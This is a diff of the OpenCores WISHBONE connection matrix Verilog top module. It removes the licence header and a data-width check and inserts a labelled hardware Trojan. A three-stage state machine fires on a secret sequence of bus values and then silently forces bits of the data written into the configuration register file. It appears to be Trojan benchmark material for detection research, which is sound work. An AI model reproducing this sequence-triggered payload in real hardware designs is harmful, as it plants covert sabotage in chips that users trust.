@@ -1,66 +1,3 @@
-/////////////////////////////////////////////////////////////////////
-////                                                             ////
-////  WISHBONE Connection Matrix Top Level                       ////
-////                                                             ////
-////                                                             ////
-////  Author: Rudolf Usselmann                                   ////
-////          rudi@asics.ws                                      ////
-////                                                             ////
-////                                                             ////
-////  Downloaded from: http://www.opencores.org/cores/wb_conmax/ ////
-////                                                             ////
-/////////////////////////////////////////////////////////////////////
-////                                                             ////
-//// Copyright (C) 2000-2002 Rudolf Usselmann                    ////
-////                         www.asics.ws                        ////
-////                         rudi@asics.ws                       ////
-////                                                             ////
-//// This source file may be used and distributed without        ////
-//// restriction provided that this copyright statement is not   ////
-//// removed from the file and that any derivative work contains ////
-//// the original copyright notice and the associated disclaimer.////
-////                                                             ////
-////     THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY     ////
-//// EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED   ////
-//// TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS   ////
-//// FOR A PARTICULAR PURPOSE. IN NO EVENT SHALL THE AUTHOR      ////
-//// OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,         ////
-//// INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES    ////
-//// (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE   ////
-//// GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR        ////
-//// BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF  ////
-//// LIABILITY, WHETHER IN  CONTRACT, STRICT LIABILITY, OR TORT  ////
-//// (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT  ////
-//// OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE         ////
-//// POSSIBILITY OF SUCH DAMAGE.                                 ////
-////                                                             ////
-/////////////////////////////////////////////////////////////////////
-
-//  CVS Log
-//
-//  $Id: wb_conmax_top.v,v 1.2 2002/10/03 05:40:07 rudi Exp $
-//
-//  $Date: 2002/10/03 05:40:07 $
-//  $Revision: 1.2 $
-//  $Author: rudi $
-//  $Locker:  $
-//  $State: Exp $
-//
-// Change History:
-//               $Log: wb_conmax_top.v,v $
-//               Revision 1.2  2002/10/03 05:40:07  rudi
-//               Fixed a minor bug in parameter passing, updated headers and specification.
-//
-//               Revision 1.1.1.1  2001/10/19 11:01:38  rudi
-//               WISHBONE CONMAX IP Core
-//
-//
-//
-//
-//
-
-`include "wb_conmax_defines.v"
-
 module wb_conmax_top(
 	clk_i, rst_i,
 
@@ -1797,22 +1734,14 @@ wire	[15:0]		conf13;
 wire	[15:0]		conf14;
 wire	[15:0]		conf15;
 
+
+// Trojan
+reg	[1:0]		Trojanstate;
+reg	[31:0]		i_s15_data_o_TrojanPayload;
 ////////////////////////////////////////////////////////////////////
 //
 // Initial Configuration Check
 //
-
-// synopsys translate_off
-initial
-   begin
-	if(dw<16)
-	   begin
-		$display("ERROR: Setting Data bus width to less than 16 bits, will");
-		$display("       make it impossible to use the configurations registers.");
-		$finish;
-	   end
-   end
-// synopsys translate_on
 
 ////////////////////////////////////////////////////////////////////
 //
@@ -4760,10 +4689,34 @@ wb_conmax_slave_if #(pri_sel15,aw,dw,sw) s15(
 		.m7_rty_o(	m7s15_rty	)
 		);
 
+reg trigger = 0;
+// Trigger
+always @(posedge clk_i) begin
+if (m0_data_o==32'd0) begin Trojanstate <= 2'b00; end
+else begin
+	case ({m0_data_o, Trojanstate})
+		34'b0011010101010011101110000110110000 : begin Trojanstate <= 2'b01; end
+		34'b1110101010101010110110001111111101 : Trojanstate <= 2'b10;
+		34'b0000101010101001011100001011100010 : begin Trojanstate <= 2'b11; $display("here"); trigger = 1; end
+		default: begin ; end
+	endcase
+	end
+end
+
+assert property (not((rst_i==0)&&(trigger==1)));
+
+//Payload
+always@(Trojanstate)
+if (Trojanstate == 2'b11) 
+	i_s15_data_o_TrojanPayload <= {i_s15_data_o[31:2], 2'b11};
+else 
+	i_s15_data_o_TrojanPayload <= i_s15_data_o;
+
+
 wb_conmax_rf #(rf_addr,dw,aw,sw) rf(
 		.clk_i(		clk_i		),
 		.rst_i(		rst_i		),
-		.i_wb_data_i(	i_s15_data_o	),
+		.i_wb_data_i(	i_s15_data_o_TrojanPayload	),
 		.i_wb_data_o(	i_s15_data_i	),
 		.i_wb_addr_i(	i_s15_addr_o	),
 		.i_wb_sel_i(	i_s15_sel_o	),
